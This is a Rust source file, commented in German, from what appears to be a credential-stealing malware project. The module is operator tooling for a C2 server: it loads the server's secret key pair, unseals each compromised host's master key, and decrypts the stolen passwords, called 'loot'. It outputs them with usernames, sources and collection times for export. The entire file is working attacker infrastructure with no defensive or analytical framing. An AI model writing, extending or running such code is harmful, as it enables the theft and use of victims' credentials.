//! Entschlüsselung der Beute mit dem geheimen Server-Schlüssel.
//!
//! Der C2-Server speichert die Secrets verschlüsselt. Der Operator gewinnt
//! den Master-Key eines Hosts aus dessen versiegeltem Material und
//! entschlüsselt damit die Secrets dieses Hosts — auf seinem Rechner, nicht
//! auf dem Server.
//!
//! Das Ergebnis ist **derselbe Typ** wie die Eingabe. Es gab vorher einen
//! zweiten Typ (`Klartext`) für denselben Sachverhalt, ohne `id` und ohne
//! `collected_at`; der Export baute ihn zurück und verlor dabei beide Felder —
//! im entschlüsselten CSV-Export stand der Erfassungszeitpunkt in **jeder**
//! Zeile leer, obwohl die Spalte existiert.

use std::collections::HashMap;
use std::path::Path;

use kx_core::c2::{ExfiltratedSecret, Host};
use kx_core::hostkey::{ServerKeyBundle, ServerKeyPair};

/// Der Entschüsselungskontext des Operators.
pub struct Decryptor {
    server: ServerKeyPair,
}

impl Decryptor {
    /// Lädt das geheime Schlüsselpaar des Servers.
    ///
    /// Die Datei enthält das `ServerKeyBundle` — der Operator erzeugt sie mit
    /// `cargo run -p kx-core --example gen_server_key`.
    pub fn load(pfad: &Path) -> Result<Self, String> {
        let text = std::fs::read_to_string(pfad)
            .map_err(|e| format!("Server-Schlüssel {} nicht lesbar: {e}", pfad.display()))?;
        let bundle = ServerKeyBundle::from_json(&text)
            .map_err(|e| format!("Server-Schlüssel ungültig: {e}"))?;
        let server = ServerKeyPair::from_bundle(&bundle)
            .map_err(|e| format!("Server-Schlüssel ungültig: {e}"))?;
        Ok(Decryptor { server })
    }

    /// Gewinnt die Master-Keys der Hosts aus deren versiegeltem Material.
    fn master_keys(&self, hosts: &[Host]) -> HashMap<String, [u8; 32]> {
        let mut schluessel = HashMap::new();
        for host in hosts {
            if host.sealed_master.is_empty() {
                continue;
            }
            let roh = match kx_core::util::b64_decode(&host.sealed_master) {
                Ok(bytes) => bytes,
                Err(_) => continue,
            };
            if let Ok(master) = self.server.unseal_master_key(&roh) {
                schluessel.insert(host.host_id.clone(), master);
            }
        }
        schluessel
    }

    /// Entschlüsselt alle Secrets, zu denen der Master-Key vorliegt.
    ///
    /// Secrets ohne versiegeltes Material bleiben unentschlüsselt — sie wurden
    /// vom Agenten ohne Server-Schlüssel im Klartext gemeldet.
    ///
    /// Jedes Ergebnis trägt **alle** Felder der Eingabe: `id` und
    /// `collected_at` eingeschlossen. Das Passwort steht im Klartextfeld, das
    /// versiegelte Feld ist leer — der Operator hat den Klartext, ein zweites
    /// Mal wäre es doppelt.
    pub fn decrypt_all(
        &self,
        hosts: &[Host],
        secrets: &[ExfiltratedSecret],
    ) -> Vec<ExfiltratedSecret> {
        let master_keys = self.master_keys(hosts);
        let mut out = Vec::new();
        for secret in secrets {
            let passwort = match (
                &master_keys.get(&secret.host_id),
                secret.sealed_password.is_empty(),
            ) {
                (Some(master), false) => {
                    kx_core::secretbox::open(master.as_slice(), &secret.sealed_password).ok()
                }
                _ => None,
            };
            let wert = passwort.unwrap_or_else(|| secret.password.clone());
            out.push(
                ExfiltratedSecret {
                    id: secret.id.clone(),
                    host_id: secret.host_id.clone(),
                    cred_type: secret.cred_type.clone(),
                    username: secret.username.clone(),
                    password: String::new(),
                    source: secret.source.clone(),
                    collected_at: secret.collected_at.clone(),
                    sealed_password: String::new(),
                }
                .mit_passwort(&wert),
            );
        }
        out
    }
}
